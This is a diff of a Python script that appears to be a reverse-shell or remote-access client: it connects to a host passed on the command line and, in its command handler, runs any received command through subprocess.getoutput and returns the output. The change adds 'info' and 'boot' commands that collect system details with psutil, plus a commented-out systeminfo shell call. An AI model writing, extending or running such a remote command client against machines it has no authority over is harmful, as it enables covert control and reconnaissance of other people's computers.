@@ -2,8 +2,10 @@ import socket
 import os
 import subprocess
 import sys
-import utilities
 import utilities.list_information
+import json
+import psutil
+
 
 # initialize variables
 SERVER_HOST = sys.argv[1]
@@ -36,8 +38,14 @@ def handle_client_commands(socket, BUFFER_SIZE, SEPARATOR):
             else:
                 # if operation is successful, empty message
                 output = ""
-        if command.lower() == "list":
-            output = utilities.list_information.list_information()
+        if command.lower() == "info":
+            output = utilities.list_information.basic_info()
+            output = json.dumps(output, indent=4)
+        elif command.lower() == "boot":
+             output = utilities.list_information.boot_time()
+             output = json.dumps(output, indent=4)
+        # elif command.lower() == "boot": #possible to use direct cmd.exe commands, but using psutil works for other os.
+        #     output = subprocess.check_output('systeminfo | find "System Boot Time"', shell=True, text=True)
         else:
             output = subprocess.getoutput(command)
         # get the current working directory as output
